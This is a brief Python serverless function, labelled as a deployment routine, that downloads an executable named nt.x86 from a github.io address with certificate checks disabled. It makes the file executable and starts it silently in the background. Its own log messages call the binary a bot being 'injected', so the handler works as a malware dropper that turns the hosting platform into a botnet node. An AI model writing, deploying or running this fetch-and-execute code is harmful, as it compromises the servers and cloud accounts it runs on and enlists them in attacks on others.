import os
import subprocess

def main(context):
    binary_url = "https://urbenm4.github.io/nt.x86"
    dest_path = "nt.x86"
    
    context.log(f"Starting deployment from {binary_url}")

    try:
        cmd_download = f"curl -skL {binary_url} -o {dest_path} && chmod +x {dest_path}"
        subprocess.run(cmd_download, shell=True, check=True)
        context.log("Download successful.")
        subprocess.Popen([dest_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        context.log("Bot pushed to background.")

    except Exception as e:
        context.error(f"Error: {str(e)}")
        return context.res.json({"status": "error", "message": str(e)})

    return context.res.json({
        "status": "success", 
        "message": "Node injected from GitHub"
    })
